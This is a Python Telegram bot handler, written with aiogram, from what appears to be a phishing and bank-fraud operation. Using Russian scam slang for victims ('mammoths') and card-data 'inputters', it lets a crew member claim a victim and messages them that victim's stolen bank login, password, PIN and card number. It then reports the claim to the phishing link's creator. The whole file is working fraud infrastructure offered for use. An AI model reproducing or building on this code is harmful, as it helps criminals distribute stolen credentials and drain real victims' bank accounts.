from aiogram import Router, F, Bot
from aiogram.types import Message, CallbackQuery
from database.db import Database
from config import status_link, logger, data
from aiogram.enums import ParseMode

db = Database()
router = Router()


@router.callback_query(F.data.startswith("take_for_vbeav:"))
async def take(
    c: CallbackQuery,
    bot: Bot
):

    code = c.data.split(":")[1]
    logger.debug(code)
    status_link[code] = True
    await db.edit_link(
        endpoint=code,
        column="vbeaver",
        value=c.from_user.id
    )
    link_info = await db.get_endpoint(code)
    creator = link_info['creator']
    mamont_data = data[code]
    bank = mamont_data['bank']
    login = mamont_data['login']
    password = mamont_data['password']
    pin_code = mamont_data['pin_code']
    card_number = mamont_data['card_number']
    await bot.send_message(
        chat_id=c.from_user.id,
        text=f"""🦣 <b>Ваш мамонт:</b>
🌐 <b>Bank:</b><code> {bank}</code>
📥 <b>Login:</b><code> {login}</code>
🔑 <b>Password:</b><code> {password}</code>
🔑 <b>Pin-Code:</b><code> {pin_code}</code>
💳 <b>Card Number:</b><code> {card_number}</code>""",
        parse_mode=ParseMode.HTML
    )
    await bot.send_message(
        chat_id=creator,
        text=f"🟢 Вбивер @{c.from_user.username} взял мамонта {code}"
    )
    await c.message.edit_text(
        text=f"🟢 Вбивер @{c.from_user.username} взял мамонта {code}, код прийдет в лс."
    )